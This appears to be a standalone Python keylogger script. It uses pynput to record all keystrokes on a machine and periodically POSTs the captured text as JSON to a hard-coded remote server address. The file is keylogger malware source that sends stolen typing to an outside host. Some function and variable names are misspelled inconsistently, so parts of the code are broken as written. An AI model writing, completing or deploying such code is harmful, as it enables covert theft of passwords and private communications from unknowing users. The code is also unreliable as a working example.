from pynput import keyboard
import requests
import json
import threading

keystrokes = ""

server_ip = "192.168.43.26"
server_port = 8080

send_interval = 10

def send_keystokes():
    try:
        payload = json.dumps({"keyboardData": keystokes})
        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})

        timer = threading.Timer(send_interval, send_keystrokes)
        timer.start()
    except:
        print("Couldn't complete request!")

def handle_keystrokes(key):
    global keystrokes

    if key == keyboard.Key.enter:
        keystrokes += "\n"
    elif key == keyboard.Key.tab:
        keystrokes += "\t"
    elif key == keyboard.Key.space:
        keystrokes += " "
    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
        pass
    elif key == keyboard.Key.backspace:
        if len(keystrokes) > 0:
            keystrokes = keystrokes[:-1]
    elif key == keyboard.Key.esc:
        return False
    else:
        keystrokes += str(key).strip("'")

with keyboard.Listener(on_press=handle_keystrokes) as listener:
    send_keystokes()
    listener.join()

